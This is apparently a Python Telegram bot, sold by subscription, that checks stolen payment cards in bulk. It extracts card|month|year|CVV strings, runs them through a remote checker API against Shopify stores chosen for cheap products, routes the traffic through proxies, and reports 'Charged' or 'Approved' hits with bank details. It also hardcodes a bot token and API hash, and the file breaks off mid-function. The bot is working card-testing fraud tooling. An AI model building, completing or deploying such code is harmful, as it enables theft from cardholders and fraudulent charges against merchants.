import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import secrets
import requests
from datetime import datetime
from telethon import TelegramClient, events, Button

# ==================== إعدادات البوت ====================
CHECKER_API_URL = 'https://apiehopf-production.up.railway.app'

API_ID = 38208016
API_HASH = '0d52125034b6a0d0dac3e71b40cea032'
BOT_TOKEN = '8985561921:AAH26NPSH3Iin7RCpKfi1Q057X1umDjfgds'
ADMIN_IDS = [1093032296]

# إعدادات الاشتراك الزمني بالنجوم
STAR_PRICES = {
    "1h": {"name": "1 Hour", "stars": 30, "seconds": 3600},
    "12h": {"name": "12 Hours", "stars": 50, "seconds": 43200},
    "1d": {"name": "1 Day", "stars": 100, "seconds": 86400},
    "3d": {"name": "3 Days", "stars": 250, "seconds": 259200},
    "7d": {"name": "1 Week", "stars": 500, "seconds": 604800},
}

# إعدادات الفحص
MAX_CARDS_PER_COMBO = 5000
ADMIN_MAX_CARDS = 50000
PENDING_TIMEOUT = 300
MESSAGE_DELAY = 1.5
MAX_RETRY_ON_FLOOD = 3
MAX_WORKERS = 4

# البوابات المسموحة فقط (Shopify)
ALLOWED_GATEWAYS = ['shopify payments', 'shopify', 'shopify_payments', 'stripe']

# نطاقات الأسعار للفلتر
PRICE_RANGES = {
    "1": {"name": "🔰 1$ - 10$", "min": 1, "max": 10},
    "2": {"name": "💰 5$ - 20$", "min": 5, "max": 20},
    "3": {"name": "💎 10$ - 30$", "min": 10, "max": 30},
    "4": {"name": "⭐ No filter", "min": 0, "max": 999999}
}

# متغيرات التحكم
user_last_message_time = {}
active_sessions = {}
user_current_check = {}
user_pending_mass = {}
user_pending_sites = {}  # للمواقع المنتظرة بعد رفع ملف

bot = TelegramClient('joker_bot', API_ID, API_HASH)

# ==================== دوال المواقع (عامة) ====================
def load_sites():
    if not os.path.exists('sites.txt'):
        return []
    try:
        with open('sites.txt', 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_sites(sites):
    with open('sites.txt', 'w', encoding='utf-8') as f:
        for site in sites:
            f.write(f"{site}\n")

# ==================== دوال البروكسيات (خاصة بكل مستخدم) ====================
def get_user_proxy_file(user_id):
    return f"user_{user_id}_proxy.txt"

def load_user_proxies(user_id):
    file_path = get_user_proxy_file(user_id)
    if not os.path.exists(file_path):
        return []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_user_proxies(user_id, proxies):
    file_path = get_user_proxy_file(user_id)
    with open(file_path, 'w', encoding='utf-8') as f:
        for proxy in proxies:
            f.write(f"{proxy}\n")

# ==================== دوال المستخدمين والاشتراك ====================
USERS_FILE = 'users.json'
CODES_FILE = 'codes.json'

def load_users():
    if not os.path.exists(USERS_FILE):
        return {}
    try:
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def load_codes():
    if not os.path.exists(CODES_FILE):
        return {}
    try:
        with open(CODES_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_codes(codes):
    with open(CODES_FILE, 'w', encoding='utf-8') as f:
        json.dump(codes, f, indent=2, ensure_ascii=False)

def get_user_subscription(user_id):
    users = load_users()
    user_data = users.get(str(user_id), {})
    expiry = user_data.get('subscription_expiry', 0)
    if expiry > time.time():
        return True, expiry
    return False, 0

def get_user_time_left(user_id):
    if is_admin(user_id):
        return "Unlimited"
    is_active, expiry = get_user_subscription(user_id)
    if is_active:
        remaining = int(expiry - time.time())
        hours = remaining // 3600
        minutes = (remaining % 3600) // 60
        return f"{hours}h {minutes}m"
    return "Expired"

def activate_subscription(user_id, plan_key):
    plan = STAR_PRICES.get(plan_key)
    if not plan:
        return False, "Invalid plan"
    
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {}
    
    now = time.time()
    current_expiry = users[user_id_str].get('subscription_expiry', 0)
    
    if current_expiry > now:
        new_expiry = current_expiry + plan['seconds']
    else:
        new_expiry = now + plan['seconds']
    
    users[user_id_str]['subscription_expiry'] = new_expiry
    users[user_id_str]['premium'] = True
    save_users(users)
    return True, new_expiry

def generate_activation_code():
    return secrets.token_hex(8).upper()

def create_activation_code(seconds=86400):
    codes = load_codes()
    code = generate_activation_code()
    codes[code] = {
        'seconds': seconds,
        'used': False,
        'used_by': None,
        'created_at': datetime.now().isoformat()
    }
    save_codes(codes)
    return code

def activate_code(user_id, code):
    if is_admin(user_id):
        return True, "أنت أدمن، لا تحتاج تفعيل!"
    codes = load_codes()
    if code not in codes:
        return False, "الكود غير صالح!"
    code_data = codes[code]
    if code_data.get('used', False):
        return False, "الكود مستخدم من قبل!"
    
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {}
    
    now = time.time()
    current_expiry = users[user_id_str].get('subscription_expiry', 0)
    if current_expiry > now:
        new_expiry = current_expiry + code_data['seconds']
    else:
        new_expiry = now + code_data['seconds']
    
    users[user_id_str]['subscription_expiry'] = new_expiry
    users[user_id_str]['premium'] = True
    
    code_data['used'] = True
    code_data['used_by'] = user_id_str
    code_data['used_at'] = datetime.now().isoformat()
    
    save_users(users)
    save_codes(codes)
    
    hours = code_data['seconds'] // 3600
    return True, f"تم التفعيل! أضيف {hours} ساعة. ينتهي في {datetime.fromtimestamp(new_expiry).strftime('%Y-%m-%d %H:%M:%S')}"

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_user_blocked(user_id):
    if is_admin(user_id):
        return False
    users = load_users()
    user_data = users.get(str(user_id), {})
    return user_data.get('blocked', False)

def block_user(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {}
    users[user_id_str]['blocked'] = True
    save_users(users)

def unblock_user(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        users[user_id_str]['blocked'] = False
        save_users(users)

def get_all_users():
    return load_users()

def is_user_subscribed(user_id):
    if is_admin(user_id):
        return True
    is_active, _ = get_user_subscription(user_id)
    return is_active

async def create_user_if_not_exists(user_id, username):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {
            'user_id': user_id,
            'username': username,
            'registered_at': datetime.now().isoformat(),
            'subscription_expiry': 0,
            'premium': False,
            'blocked': False
        }
        save_users(users)

# ==================== نظام إعادة الإرسال ====================
async def send_with_retry(user_id, message, parse_mode='html', buttons=None, file=None, retry_count=0):
    try:
        entity = await bot.get_entity(user_id)
        if getattr(entity, 'bot', False):
            return None
    except:
        pass
    
    now = time.time()
    last_time = user_last_message_time.get(user_id, 0)
    time_since_last = now - last_time
    
    if time_since_last < MESSAGE_DELAY:
        await asyncio.sleep(MESSAGE_DELAY - time_since_last)
    
    try:
        if file:
            result = await bot.send_file(user_id, file, caption=message, parse_mode=parse_mode)
        elif buttons:
            result = await bot.send_message(user_id, message, buttons=buttons, parse_mode=parse_mode)
        else:
            result = await bot.send_message(user_id, message, parse_mode=parse_mode)
        user_last_message_time[user_id] = time.time()
        return result
    except Exception as e:
        error_msg = str(e).lower()
        if "flood" in error_msg or "wait" in error_msg:
            import re
            match = re.search(r'(\d+)', str(e))
            if match:
                wait_time = int(match.group(1))
                print(f"[!] FloodWait: {wait_time}s")
                await asyncio.sleep(wait_time + 2)
                if retry_count < MAX_RETRY_ON_FLOOD:
                    return await send_with_retry(user_id, message, parse_mode, buttons, file, retry_count + 1)
            else:
                await asyncio.sleep(30)
                if retry_count < MAX_RETRY_ON_FLOOD:
                    return await send_with_retry(user_id, message, parse_mode, buttons, file, retry_count + 1)
        elif "userisbot" in error_msg:
            return None
        raise

# ==================== الإيموجي المميزة ====================
PREMIUM_EMOJI_IDS = {
    "✅": "5123163417326126159", "❌": "5121063440311386962", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5444860552310457690", "🌐": "5447602197439218445", "📊": "4911241630633165627",
    "⭐": "5801104080646444587", "👑": "5303547611351902889", "💎": "5305726937887433606",
}

def premium_emoji(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result

# ==================== الكيبوردات ====================
def get_main_menu_keyboard():
    return [[Button.inline("📋 Commands", b"show_commands")], [Button.url("📢 Channel", "https://t.me/JOKER")]]

def get_commands_keyboard():
    return [[Button.inline("🔙 Back", b"main_menu")]]

def get_admin_menu_keyboard():
    return [
        [Button.inline("📊 Stats", b"admin_stats")], [Button.inline("📢 Broadcast", b"admin_broadcast")],
        [Button.inline("🔨 Block", b"admin_block")], [Button.inline("🔓 Unblock", b"admin_unblock")],
        [Button.inline("📈 Add Time", b"admin_set_limit")], [Button.inline("🌐 Sites", b"admin_sites")],
        [Button.inline("🔙 Back", b"main_menu")]
    ]

def get_admin_sites_menu():
    return [
        [Button.inline("📋 View Sites", b"admin_view_sites")],
        [Button.inline("➕ Add Site", b"admin_add_site")],
        [Button.inline("🗑️ Remove Site", b"admin_remove_site")],
        [Button.inline("📁 Upload File", b"admin_upload_sites")],
        [Button.inline("🔍 Check Sites", b"admin_check_sites")],
        [Button.inline("💣 Clear All", b"admin_clear_sites")],
        [Button.inline("🔙 Back", b"admin_panel")]
    ]

def get_price_filter_keyboard():
    return [
        [Button.inline("🔰 1$ - 10$", b"price_1")],
        [Button.inline("💰 5$ - 20$", b"price_2")],
        [Button.inline("💎 10$ - 30$", b"price_3")],
        [Button.inline("⭐ No filter", b"price_4")],
        [Button.inline("🔙 Cancel", b"price_cancel")]
    ]

async def get_user_stats_text(user_id, username):
    users = load_users()
    user_data = users.get(str(user_id), {})
    is_blocked = user_data.get('blocked', False)
    sites_count = len(load_sites())
    proxies_count = len(load_user_proxies(user_id))
    time_left = get_user_time_left(user_id)
    
    if is_blocked:
        status = "🚫 Blocked"
    elif is_admin(user_id):
        status = "👑 ADMIN | Unlimited"
    else:
        is_active, expiry = get_user_subscription(user_id)
        if is_active:
            status = f"⭐ ACTIVE | {time_left} left"
        else:
            status = "🆓 EXPIRED | /subscribe"
    
    text = f"👋 Welcome @{username}!\n\n"
    text += f"🚀 Account\n\n"
    text += f"    ┣ 📝 Plan: {status}\n"
    text += f"    ┣ 🌐 Sites: {sites_count}\n"
    text += f"    ┣ 🔌 Your Proxies: {proxies_count}\n"
    text += f"    ┗ 💡 Max combo: {MAX_CARDS_PER_COMBO} cards\n\n"
    text += f"💡 Buy subscription: /subscribe\n"
    text += f"🔌 Add proxies: /addproxy or /addproxies"
    return text

# ==================== دوال API ====================
def parse_proxy_url(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if '@' in proxy_str:
        return f"http://{proxy_str}"
    parts = proxy_str.split(':')
    if len(parts) == 4:
        host, port, user, password = parts
        return f"http://{user}:{password}@{host}:{port}"
    if len(parts) == 2:
        return f"http://{host}:{port}"
    return None

# فحص بروكسي سريع
async def test_proxy_fast(proxy_str):
    proxy_url = parse_proxy_url(proxy_str)
    if not proxy_url:
        return {'proxy': proxy_str, 'status': 'dead', 'reason': 'Invalid format'}
    try:
        timeout = aiohttp.ClientTimeout(total=3)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get("https://musicstore.myshopify.com", proxy=proxy_url, ssl=False) as resp:
                if resp.status == 200:
                    return {'proxy': proxy_str, 'status': 'alive', 'reason': 'OK'}
                return {'proxy': proxy_str, 'status': 'dead', 'reason': f'HTTP {resp.status}'}
    except:
        return {'proxy': proxy_str, 'status': 'dead', 'reason': 'Timeout'}

# فحص موقع أساسي
async def test_site_basic(site, proxy):
    test_card = "4031630422575208|01|2030|280"
    try:
        site = site.replace('https://', '').replace('http://', '').rstrip('/')
        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={test_card}'
        if proxy:
            url += f'&proxy={proxy}'
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'site': site, 'status': 'dead'}
                raw = await resp.json()
                return {'site': site, 'status': 'alive' if raw.get('Status') else 'dead'}
    except:
        return {'site': site, 'status': 'dead'}

# جلب Gateway الموقع
async def get_site_gateway(site, proxy):
    test_card = "4031630422575208|01|2030|280"
    try:
        site = site.replace('https://', '').replace('http://', '').rstrip('/')
        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={test_card}'
        if proxy:
            url += f'&proxy={proxy}'
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return None
                raw = await resp.json()
                return raw.get('Gateway', '').lower()
    except:
        return None

# جلب أرخص سعر منتج في الموقع
async def get_site_min_price(site):
    try:
        site = site.replace('https://', '').replace('http://', '').rstrip('/')
        url = f'https://{site}/products.json?limit=50'
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return None
                data = await resp.json()
                min_price = None
                for product in data.get('products', []):
                    for variant in product.get('variants', []):
                        if variant.get('available', True):
                            try:
                                price = float(variant.get('price', 0))
                                if min_price is None or price < min_price:
                                    min_price = price
                            except:
                                pass
                return min_price
    except:
        return None

# فحص موقع كامل (للفلتر)
async def check_site_full(site, proxy, price_range):
    """فحص موقع كامل: التحقق من الـ Gateway والسعر"""
    try:
        # 1. فحص الـ Gateway
        gateway = await get_site_gateway(site, proxy)
        if not gateway or not any(allowed in gateway for allowed in ALLOWED_GATEWAYS):
            return {'site': site, 'status': 'dead', 'reason': f'Gateway: {gateway or "Unknown"}'}
        
        # 2. فحص السعر إذا كان مطلوب
        if price_range["min"] > 0 or price_range["max"] < 999999:
            min_price = await get_site_min_price(site)
            if min_price is None:
                return {'site': site, 'status': 'dead', 'reason': 'No products found'}
            if min_price > price_range["max"]:
                return {'site': site, 'status': 'dead', 'reason': f'Min price ${min_price:.2f} > ${price_range["max"]}'}
        
        return {'site': site, 'status': 'alive', 'reason': f'Gateway: {gateway}'}
    except Exception as e:
        return {'site': site, 'status': 'dead', 'reason': str(e)[:50]}

# فحص كارت
async def check_card(card, site, proxy):
    try:
        site = site.replace('https://', '').replace('http://', '').rstrip('/')
        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={card}'
        if proxy:
            url += f'&proxy={proxy}'
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Dead', 'message': f'HTTP {resp.status}', 'card': card}
                raw = await resp.json()
        
        response_msg = raw.get('Response', '')
        price = raw.get('Price', 0.0)
        gateway = raw.get('Gateway', 'Shopify')
        try:
            price = f"${float(price):.2f}"
        except:
            price = "-"
        
        charged_kw = ['ORDER_PLACED', 'PROCESSEDRECEIPT', 'ORDER_CONFIRMED', 'SUCCESS', 'CHARGED']
        approved_kw = ['INSUFFICIENT_FUNDS', 'OTP_REQUIRED', '3D_SECURE', 'ACTION_REQUIRED']
        resp_upper = response_msg.upper()
        
        if any(k in resp_upper for k in charged_kw):
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'gateway': gateway, 'price': price}
        elif any(k in resp_upper for k in approved_kw):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'gateway': gateway, 'price': price}
        return {'status': 'Dead', 'message': response_msg or 'Declined', 'card': card, 'gateway': gateway, 'price': price}
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Timeout', 'card': card, 'retry': True}
    except Exception as e:
        return {'status': 'Dead', 'message': str(e)[:50], 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    if not sites or not proxies:
        return {'status': 'Dead', 'message': 'No sites/proxies', 'card': card}
    for attempt in range(max_retries):
        result = await check_card(card, random.choice(sites), random.choice(proxies))
        if not result.get('retry'):
            return result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.5)
    return {'status': 'Dead', 'message': 'Max retries', 'card': card}

async def get_bin_info(card_number):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{card_number[:6]}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                data = await res.json()
                return data.get('brand', '-'), data.get('type', '-'), data.get('level', '-'), data.get('bank', '-'), data.get('country_name', '-'), data.get('country_flag', '')
    except:
        return '-', '-', '-', '-', '-', ''

def extract_cc(text):
    matches = re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', text)
    cards = []
    for card, month, year, cvv in matches:
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

async def send_hit_message(user_id, result, hit_type):
    emoji = "💎" if hit_type == 'Charged' else "✅"
    status_text = "CHARGED" if hit_type == 'Charged' else "APPROVED"
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    msg = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡ HIT</b>
<blockquote>{emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:100]}</blockquote>
<blockquote>🌐 Gateway: {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>💠 BIN Info</b>
<pre>BIN: {brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}</pre>"""
    await send_with_retry(user_id, premium_emoji(msg), parse_mode='html')

# ==================== نظام الدفع بالنجوم ====================
def send_star_invoice(chat_id, title, description, payload, prices):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendInvoice"
    prices_list = [{"label": label, "amount": amount} for label, amount in prices]
    data = {
        "chat_id": chat_id,
        "title": title,
        "description": description,
        "payload": payload,
        "provider_token": "",
        "currency": "XTR",
        "prices": json.dumps(prices_list),
        "start_parameter": "subscription"
    }
    try:
        response = requests.post(url, json=data, timeout=30)
        return response.json()
    except Exception as e:
        print(f"Invoice error: {e}")
        return None

async def create_star_invoice(user_id, plan_key):
    plan = STAR_PRICES.get(plan_key)
    if not plan:
        return None
    
    title = f"⭐ {plan['name']} Subscription"
    description = f"Subscribe for {plan['name']}\nDuration: {plan['name']}"
    payload = f"sub_{plan_key}"
    prices = [(plan['name'], plan['stars'])]
    
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, send_star_invoice, user_id, title, description, payload, prices)
    
    if result and result.get('ok'):
        return result
    return None

async def check_for_payments():
    last_update_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=30"
            response = requests.get(url, timeout=35)
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    for update in data.get('result', []):
                        last_update_id = update.get('update_id', last_update_id)
                        if 'message' in update and 'successful_payment' in update['message']:
                            await handle_successful_payment(update['message'])
        except Exception as e:
            print(f"Payment check error: {e}")
        await asyncio.sleep(2)

async def handle_successful_payment(message):
    try:
        user_id = message['from']['id']
        payment = message['successful_payment']
        payload = payment.get('invoice_payload', '')
        
        if payload.startswith("sub_"):
            plan_key = payload.split("_")[1]
            plan = STAR_PRICES.get(plan_key)
            
            if plan:
                success, expiry = activate_subscription(user_id, plan_key)
                if success:
                    expiry_date = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')
                    await send_with_retry(
                        user_id,
                        premium_emoji(f"✅ <b>Subscription Activated!</b>\n\n"
                                     f"⭐ Plan: {plan['name']}\n"
                                     f"📅 Expires: {expiry_date}\n\n"
                                     f"Thank you! 🚀"),
                        parse_mode='html'
                    )
                    
                    for admin_id in ADMIN_IDS:
                        await send_with_retry(
                            admin_id,
                            premium_emoji(f"💎 <b>Star Payment!</b>\n"
                                         f"👤 User: <code>{user_id}</code>\n"
                                         f"⭐ Plan: {plan['name']}\n"
                                         f"💰 Amount: {plan['stars']} stars"),
                            parse_mode='html'
                        )
                    print(f"[PAYMENT] User {user_id} bought {plan['name']}")
    except Exception as e:
        print(f"[PAYMENT ERROR] {e}")

# ==================== منع البوتات ====================
@bot.on(events.NewMessage)
async def ignore_bots(event):
    try:
        sender = await event.get_sender()
        if getattr(sender, 'bot', False):
            raise events.StopPropagation
    except:
        pass

# ==================== أوامر البوت الأساسية ====================
ALLOWED_COMMANDS = ['/start', '/help', '/subscribe', '/redeem']

@bot.on(events.NewMessage)
async def check_subscription(event):
    user_id = event.sender_id
    
    try:
        sender = await event.get_sender()
        if getattr(sender, 'bot', False):
            raise events.StopPropagation
    except:
        pass
    
    if is_admin(user_id):
        return
    
    if any(event.raw_text.startswith(cmd) for cmd in ALLOWED_COMMANDS):
        return
    
    if not is_user_subscribed(user_id):
        try:
            await send_with_retry(user_id, premium_emoji(f"❌ <b>Access Denied</b>\n\nNo active subscription.\n\nBuy: /subscribe\nRedeem: /redeem CODE"), parse_mode='html')
        except:
            pass
        raise events.StopPropagation

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await send_with_retry(user_id, premium_emoji("🚫 Banned"), parse_mode='html')
        return
    sender = await event.get_sender()
    username = sender.username or f"user_{user_id}"
    await create_user_if_not_exists(user_id, username)
    await send_with_retry(user_id, premium_emoji(await get_user_stats_text(user_id, username)), buttons=get_main_menu_keyboard(), parse_mode='html')

@bot.on(events.CallbackQuery)
async def handle_callback(event):
    user_id = event.sender_id
    data = event.data.decode('utf-8')
    
    if data == "show_commands":
        txt = """<b>📋 COMMANDS</b>
├ /start - Menu
├ /help - Help
├ /profile - Profile
├ /myproxy - Your proxies

<b>🌐 SITES (Admin only)</b>
├ /site domain - Add site
├ /rmsite url - Remove site
├ /addsites - Upload sites file
├ /clearsites - Clear all
├ /sitecheck - Check & filter sites
├ /mysites - View all sites

<b>🔌 YOUR PROXIES</b>
├ /proxy - Check & remove dead (FAST)
├ /addproxy - Add (one per line)
├ /addproxies - Upload .txt file
├ /chkproxy - Check one
├ /rmproxy - Remove one
├ /clearproxy - Remove all
├ /getproxy - Get all

<b>💳 CARD CHECKING</b>
├ /cc card|mm|yy|cvv
├ /chk - Mass check
└ /mcancel - Cancel

<b>⭐ SUBSCRIPTION</b>
├ /subscribe - Buy
└ /redeem CODE"""
        if is_admin(user_id):
            txt += "\n\n<b>👑 ADMIN</b>\n├ /admin\n├ /gencode\n├ /block\n├ /unblock\n├ /broadcast\n├ /addtime\n├ /users\n├ /user\n└ /stats"
        await event.edit(premium_emoji(txt), buttons=get_commands_keyboard(), parse_mode='html')
    
    elif data == "main_menu":
        sender = await event.get_sender()
        username = sender.username or f"user_{user_id}"
        await event.edit(premium_emoji(await get_user_stats_text(user_id, username)), buttons=get_main_menu_keyboard(), parse_mode='html')
    
    elif data.startswith("sub_"):
        plan_key = data.split("_")[1]
        await create_star_invoice(user_id, plan_key)
        await event.answer()
    
    # أوامر الأدمن
    elif data == "admin_sites" and is_admin(user_id):
        await event.edit(premium_emoji("🌐 <b>Site Management</b>"), buttons=get_admin_sites_menu(), parse_mode='html')
    
    elif data == "admin_view_sites" and is_admin(user_id):
        sites = load_sites()
        if not sites:
            await event.edit(premium_emoji("📋 No sites found."), parse_mode='html')
        else:
            txt = "\n".join([f"• {s}" for s in sites])
            await event.edit(premium_emoji(f"📋 <b>Sites ({len(sites)}):</b>\n\n{txt}"), buttons=[[Button.inline("🔙 Back", b"admin_sites")]], parse_mode='html')
    
    elif data == "admin_add_site" and is_admin(user_id):
        await event.edit(premium_emoji("➕ <b>Send site domain</b>\n\nExample: <code>example.com</code>\n\nSend /cancel to cancel."), parse_mode='html')
        bot.register_next_step(event, admin_add_site_step)
    
    elif data == "admin_remove_site" and is_admin(user_id):
        sites = load_sites()
        if not sites:
            await event.edit(premium_emoji("❌ No sites to remove."), parse_mode='html')
        else:
            kb = [[Button.inline(s[:30], f"remove_site_{s}")] for s in sites[:20]]
            kb.append([Button.inline("🔙 Back", b"admin_sites")])
            await event.edit(premium_emoji("🗑️ <b>Select site to remove:</b>"), buttons=kb, parse_mode='html')
    
    elif data == "admin_upload_sites" and is_admin(user_id):
        await event.edit(premium_emoji("📁 <b>Send a .txt file with sites</b>\n\nOne site per line.\n\nYou will then select a price filter."), parse_mode='html')
        bot.register_next_step(event, admin_upload_sites_step)
    
    elif data == "admin_check_sites" and is_admin(user_id):
        sites = load_sites()
        if not sites:
            await event.edit(premium_emoji("❌ No sites to check."), parse_mode='html')
        else:
            user_pending_sites[user_id] = {
                'action': 'check',
                'sites': sites,
                'expires': time.time() + PENDING_TIMEOUT
            }
            await event.edit(premium_emoji("💰 <b>Select price range to filter sites:</b>\n\nSites with cheapest product above selected range will be removed."), buttons=get_price_filter_keyboard(), parse_mode='html')
    
    elif data == "admin_clear_sites" and is_admin(user_id):
        save_sites([])
        await event.edit(premium_emoji("✅ All sites cleared!"), buttons=get_admin_sites_menu(), parse_mode='html')
    
    elif data.startswith("remove_site_") and is_admin(user_id):
        site = data.replace("remove_site_", "")
        sites = load_sites()
        if site in sites:
            save_sites([s for s in sites if s != site])
            await event.edit(premium_emoji(f"✅ Removed: {site}"), buttons=get_admin_sites_menu(), parse_mode='html')
        else:
            await event.edit(premium_emoji(f"❌ Site not found."), buttons=get_admin_sites_menu(), parse_mode='html')
    
    elif data.startswith("price_") and is_admin(user_id):
        price_key = data.split("_")[1]
        await handle_price_filter(event, user_id, price_key)
    
    elif data == "price_cancel" and is_admin(user_id):
        if user_id in user_pending_sites:
            del user_pending_sites[user_id]
        await event.edit(premium_emoji("❌ Cancelled."), buttons=get_admin_sites_menu(), parse_mode='html')
    
    elif data in ["admin_stats", "admin_broadcast", "admin_block", "admin_unblock", "admin_set_limit"] and is_admin(user_id):
        msgs = {
            "admin_stats": "📊 Stats", 
            "admin_broadcast": "📢 Send broadcast message:", 
            "admin_block": "🔨 Send user ID to block:", 
            "admin_unblock": "🔓 Send user ID to unblock:", 
            "admin_set_limit": "📈 Send user_id hours (e.g. 123456789 24):"
        }
        await event.edit(premium_emoji(msgs.get(data, "Use command")), buttons=[[Button.inline("🔙 Back", b"admin_panel")]] if data != "admin_stats" else get_admin_menu_keyboard(), parse_mode='html')
        if data != "admin_stats":
            bot.register_next_step(event, admin_callback_handler, data)
    
    elif data == "admin_panel" and is_admin(user_id):
        await event.edit(premium_emoji("<b>👑 Admin Panel</b>"), buttons=get_admin_menu_keyboard(), parse_mode='html')
    
    await event.answer()

# ==================== معالج فلتر السعر ====================
async def handle_price_filter(event, user_id, price_key):
    if user_id not in user_pending_sites:
        await event.edit(premium_emoji("❌ Session expired. Please use /sitecheck again."), buttons=get_admin_sites_menu(), parse_mode='html')
        return
    
    pending = user_pending_sites.pop(user_id)
    sites = pending['sites']
    action = pending.get('action', 'check')
    price_range = PRICE_RANGES.get(price_key, PRICE_RANGES["4"])
    
    proxies = load_user_proxies(user_id)
    if not proxies:
        await event.edit(premium_emoji("❌ No proxies available. Add proxies first."), buttons=get_admin_sites_menu(), parse_mode='html')
        return
    
    await event.edit(premium_emoji(f"🔍 Checking {len(sites)} sites with filter: {price_range['name']}\n\n⏳ This may take a few seconds..."), parse_mode='html')
    
    valid_sites = []
    invalid_sites = []
    
    for i, site in enumerate(sites):
        proxy = random.choice(proxies)
        result = await check_site_full(site, proxy, price_range)
        
        if result['status'] == 'alive':
            valid_sites.append(site)
        else:
            invalid_sites.append({'site': site, 'reason': result['reason']})
        
        if (i + 1) % 10 == 0:
            await event.edit(premium_emoji(f"🔍 Progress: {i+1}/{len(sites)}\n✅ Valid: {len(valid_sites)}\n❌ Invalid: {len(invalid_sites)}"), parse_mode='html')
    
    if action == 'check':
        save_sites(valid_sites)
        result_text = f"""✅ <b>Site Check Complete!</b>

📊 Total sites before: {len(sites)}
✅ Valid sites (Shopify): {len(valid_sites)}
❌ Invalid sites: {len(invalid_sites)}

💰 Filter applied: {price_range['name']}
🔌 Gateway: Shopify Payments only

Sites have been updated with only valid sites."""

        if invalid_sites:
            result_text += f"\n\n<b>❌ Removed sites (first 10):</b>\n"
            for inv in invalid_sites[:10]:
                result_text += f"• {inv['site'][:40]} - {inv['reason']}\n"
            if len(invalid_sites) > 10:
                result_text += f"• ... and {len(invalid_sites) - 10} more"
    
    else:
        current_sites = load_sites()
        new_sites = [s for s in valid_sites if s not in current_sites]
        all_sites = list(set(current_sites + valid_sites))
        save_sites(all_sites)
        result_text = f"""✅ <b>Sites Added with Filters!</b>

📊 Total sites in file: {len(sites)}
✅ Valid sites (Shopify): {len(valid_sites)}
📝 New sites added: {len(new_sites)}
🌐 Total sites now: {len(all_sites)}

💰 Filter applied: {price_range['name']}
🔌 Gateway: Shopify Payments only"""
    
    await event.edit(premium_emoji(result_text), buttons=get_admin_sites_menu(), parse_mode='html')

# ==================== دوال الخطوات للأدمن ====================
async def admin_add_site_step(event):
    if event.text and event.text.lower() == '/cancel':
        await event.edit(premium_emoji("❌ Cancelled."), buttons=get_admin_menu_keyboard(), parse_mode='html')
        return
    site = event.text.strip().replace('https://', '').replace('http://', '').rstrip('/')
    sites = load_sites()
    if site in sites:
        await event.edit(premium_emoji(f"⚠️ Site already exists: {site}"), buttons=get_admin_menu_keyboard(), parse_mode='html')
    else:
        save_sites(sites + [site])
        await event.edit(premium_emoji(f"✅ Added: {site}"), buttons=get_admin_menu_keyboard(), parse_mode='html')

async def admin_upload_sites_step(event):
    if event.text and event.text.lower() == '/cancel':
